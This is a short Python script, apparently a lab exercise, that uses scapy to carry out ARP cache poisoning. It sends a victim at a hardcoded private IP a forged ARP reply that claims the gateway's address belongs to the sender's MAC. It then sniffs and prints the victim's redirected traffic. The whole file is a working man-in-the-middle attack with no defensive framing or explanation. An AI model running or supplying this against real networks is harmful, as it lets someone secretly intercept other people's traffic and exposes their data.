from scapy.all import *
import netifaces
import time
import sys
import threading

a=list()


def relay():
	sniff(prn=arp_monitor_callback, filter="not arp", store=0)

def arp_monitor_callback(pkt):
	a.append(pkt)

for k in netifaces.interfaces():
    if(k=='lo'):continue
    dev=k

my_mac=netifaces.ifaddresses(dev)[netifaces.AF_LINK][0]['addr']

my_ip=netifaces.ifaddresses(dev)[netifaces.AF_INET][0]['addr']

gate_ip=netifaces.gateways()['default'][netifaces.AF_INET][0]

print dev,my_mac,my_ip, gate_ip
#vic_ip=sys.argv[1]
vic_ip="192.168.126.128"
print vic_ip

print("Send Arp Request") 

p=srp1(Ether(src=my_mac,dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has",psrc=my_ip,pdst=vic_ip))

vic_mac=p.hwsrc

print vic_mac

sendp(Ether(src=my_mac,dst=vic_mac)/ARP(op=2,hwsrc=my_mac,psrc=gate_ip,pdst=vic_ip))

t1=threading.Thread(target=relay)
t1.start()

while(1):
	print a
	time.sleep(1)